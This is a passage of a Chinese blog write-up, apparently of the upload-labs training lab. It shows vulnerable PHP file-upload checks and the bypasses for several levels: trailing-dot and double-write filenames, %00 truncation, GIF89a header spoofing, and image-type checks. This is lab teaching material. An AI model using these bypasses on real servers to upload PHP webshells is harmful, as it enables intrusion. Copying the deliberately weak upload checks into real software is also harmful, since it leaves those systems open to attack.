class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关源码和第五关相同，但这里我们介绍另一种绕过方法。</p>
<p>看源码找到了deldot()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>)-<span class="number">1</span>;<span class="variable">$i</span>&gt;<span class="number">0</span>;<span class="variable">$i</span>--)&#123;</span><br><span class="line">		<span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>)-<span class="number">1</span> <span class="keyword">and</span> <span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>,<span class="number">0</span>,<span class="variable">$i</span>+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现会将末尾的所有.删去。</p>
<blockquote>
<p><strong>strrchr(string,char)</strong> 函数查找字符串char在另一个字符串string中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。</p>
<p><strong>substr(<em>string,start,length</em>)</strong></p>
</blockquote>
<p>那我们想到构造成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base.php. .</span><br></pre></td></tr></table></figure>



<ol>
<li><pre><code>$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);	//--&gt;&quot;base.php. .&quot;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   $file_name = deldot($file_name);//删除文件名末尾的点 --&gt; &quot;base.php. &quot;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>&#96;&#96;&#96;<br>$file_ext &#x3D; strrchr($file_name, ‘.’);		&#x2F;&#x2F;–&gt;”. “</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">即可绕过，而base.php. .在windows下又会被解析成base.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Pass11【双写绕过】</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;        </span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>这个比较简单，看了下源码直接双写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base.pphphp</span><br></pre></td></tr></table></figure>

<p>由于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_ireplace</span><br></pre></td></tr></table></figure>

<p>忽视大小写，所以无法大小写绕过</p>
<h2 id="Pass12【GET方法-00截断】"><a href="#Pass12【GET方法-00截断】" class="headerlink" title="Pass12【GET方法%00截断】"></a>Pass12【GET方法%00截断】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>适用条件：</p>
<ol>
<li>php版本号低于<code>5.3.29</code></li>
<li><code>magic_quotes_gpc</code>为关闭状态</li>
</ol>
<blockquote>
<p>phpstudy调整php版本：在“网站”处</p>
<p>调整php配置：在“设置”处</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">move_uploaded_file($temp_file,$img_path)</span><br></pre></td></tr></table></figure>

<p>根据这两行，我们可以这样构造：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/12-1-1687749832994-64.png" alt="12-1"></p>
<h2 id="Pass13【POST方法-00截断】"><a href="#Pass13【POST方法-00截断】" class="headerlink" title="Pass13【POST方法%00截断】"></a>Pass13【POST方法%00截断】</h2><p>和上一关差距不大，就是换成了POST的%00截断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可是POST方法并不会像GET方法一样将%00直接转化为空格，所以要在bp上用hex转化：【70是p，0d是回车，0a是换行】</p>
<img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/13-3.png" alt="13-3" style="zoom: 50%;">



<img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/13-2.png" alt="13-2" style="zoom:50%;">













<h2 id="Pass14【检查文件的前两字节】"><a href="#Pass14【检查文件的前两字节】" class="headerlink" title="Pass14【检查文件的前两字节】"></a>Pass14【检查文件的前两字节】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bp抓包在base.php之前加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>





<h2 id="Pass15【getimagesize-判断文件类型】"><a href="#Pass15【getimagesize-判断文件类型】" class="headerlink" title="Pass15【getimagesize()判断文件类型】"></a>Pass15【getimagesize()判断文件类型】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该题是利用**getimagesize($filename)**来检查文件类型</p>
<blockquote>
<h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//返回值</span><br><span class="line">Array ( </span><br><span class="line">[0] =&gt; 894 </span><br><span class="line">[1] =&gt; 1324 </span><br><span class="line">[2] =&gt; 2 </span><br><span class="line">[3] =&gt; width=&quot;894&quot; height=&quot;1324&quot; </span><br><span class="line">[bits] =&gt; 8 </span><br><span class="line">[channels] =&gt; 3 </span><br><span class="line">[mime] =&gt; image/jpeg </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>索引 0 给出的是图像宽度的像素值</li>
<li>索引 1 给出的是图像高度的像素值</li>
<li>索引 2 给出的是图像的类型，返回的是数字，其中1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM</li>
<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</image></li>
<li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>
<li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>
<li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image&#x2F;jpeg”);</li>
</ul>
</blockquote>
<h2 id="Pass16【exif-imagetype-】"><a href="#Pass16【exif-imagetype-】" class="headerlink" title="Pass16【exif_imagetype()】"></a>Pass16【exif_imagetype()】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">   